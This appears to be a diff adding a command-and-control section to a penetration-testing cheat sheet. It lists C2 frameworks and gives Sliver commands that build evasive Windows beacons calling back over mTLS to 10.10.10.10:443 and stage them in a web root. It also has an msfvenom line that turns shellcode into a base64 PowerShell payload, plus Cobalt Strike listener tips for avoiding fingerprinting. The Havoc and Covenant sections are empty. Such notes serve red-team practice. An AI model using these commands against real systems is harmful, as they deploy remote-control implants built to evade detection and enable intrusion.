@@ -2639,3 +2639,71 @@ netsh interface portproxy show all
 # RESET
 netsh interface portproxy reset
 ```
+
+# C2
+## General
+Commertial and open source options available.
+<a href='https://www.thec2matrix.com'>C2 Matrix:</a> - C2 research
+Common C2:
+- metasploit
+- powershell empire (old)
+- silenttrinity (byt3bl33d3r)
+- Sliver (BishopFox)
+- Merlin
+- Covenant
+- Cobalt Strike
+- Havoc
+- Voodoo
+- Scythe
+
+## Sliver
+Start Sliver Server:
+```
+sudo systemctl start sliver
+```
+
+Generate Profile
+```
+profiles new beacon --arch amd64 --os windows --mtls 10.10.10.10:443 -f shellcode --evasion --timeout 300 --seconds 5 --jitter 1 RED_LAKE
+```
+
+Generate Beacons:
+```
+generate beacon --evasion --arch amd64 --mtls [ip] --format [exe,shellcode,shared,service] --os windows --save /var/www/html 
+```
+
+Convert to Shellcode to PowerShell Payload (Unstable):
+```
+msfvenom -p generic/custom PAYLOADFILE=/var/www/html/SOMETHING.bin -a x64 --platform windows -e cmd/powershell_base64 -f ps1 -o safe.ps1
+```
+
+
+Start Listener
+```bash=
+mtls 
+```
+
+## Cobalt Strike
+
+### Types of Listeners
+Beacons:
+- DNS
+    - Note: Make sure to fill BOTH the DNS HOST and (Stager) with the HOSTNAME. 
+- HTTP
+- HTTPS
+- SMB
+    - Note: Change the Pipeline (C2) to something less fingerpinted. 
+- TCP
+
+External:
+- TCP
+- C2
+
+Foreign:
+- HTTP
+- HTTPS
+
+## Havoc
+
+
+## Covenant 
